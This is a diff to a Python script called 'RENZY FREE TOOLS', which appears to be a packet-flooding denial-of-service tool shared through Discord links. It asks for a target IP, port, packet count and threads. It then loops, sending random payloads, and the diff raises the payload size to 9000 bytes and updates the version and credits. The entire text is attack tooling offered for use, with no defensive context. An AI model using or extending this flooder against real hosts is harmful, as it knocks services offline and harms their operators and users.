@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#RENZY FREE TOOLS V 2
+#RENZY FREE TOOLS V 5
 import sys
 import os
 import random
@@ -16,10 +16,10 @@ print("""\x1b[1;92m
  |_|  \_\/_____|    |_|  |______/_/    \_\_|  |_|
  """)
 print("↪ TOOLS INFORMATION ↩")
-print("↪ CREATOR : DEMON RENZY")
-print("↪ VERSION : V3 ↩")
-print("↪ COMMUNITY SERVER ↩")
-print("↪ https://dsc.gg/rzteam↩")
+print("↪ CREATOR : RENZY ARMSTRONG")
+print("↪ VERSION : V5 ↩")
+print("↪ COMMUNITY DISCORD ↩")
+print("↪ https://discord.gg/HPsHHnhaXf↩")
 
 ip = str(input(" IP :"))
 port = int(input(" Port :"))
@@ -28,7 +28,7 @@ times = int(input(" Packet :"))
 threads = int(input(" Thread :"))
 os.system("clear")
 def run():
-	data = random._urandom(2000)
+	data = random._urandom(9000)
 	i = random.choice(("[×]","[?]","[!]"))
 	while True:
 		try:
@@ -41,7 +41,7 @@ def run():
 			print("[!] Connection Time Out")
 
 def run2():
-	data = random._urandom(1024)
+	data = random._urandom(9000)
 	i = random.choice(("[×]","[?]","[!]"))
 	while True:
 		try:
